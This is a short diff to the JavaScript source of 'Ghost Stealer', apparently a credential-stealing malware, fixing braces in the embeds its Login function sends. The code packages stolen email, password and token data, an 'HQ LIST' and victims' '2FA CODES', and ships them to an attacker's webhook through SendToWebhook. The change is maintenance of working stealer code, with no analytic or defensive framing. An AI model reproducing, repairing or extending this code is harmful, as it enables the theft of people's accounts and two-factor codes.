@@ -223,6 +223,7 @@ function Login(email, password, token) {
           content: "",
           avatar_url: GHOSTEALER,
           embeds: [
+	  {
             "color": COLORSTEAL,
             "description": `**HQ LIST** (\`${total_f(json)}\`)`,
             "fields": [
@@ -238,6 +239,7 @@ function Login(email, password, token) {
             "footer": {
               "text": "Ghost Stealer"
             }
+	    }
           ]
         }
         SendToWebhook(JSON.stringify(params))
@@ -248,6 +250,7 @@ function Login(email, password, token) {
             content: "",
             avatar_url: GHOSTEALER,
             embeds: [
+	    {
               "color": COLORSTEAL,
               "description": `**2FA CODES**`,
               "fields": [
@@ -263,6 +266,7 @@ function Login(email, password, token) {
               "footer": {
                 "text": "Ghost Stealer"
               }
+	      }
             ]
           }
           SendToWebhook(JSON.stringify(mfaembed))
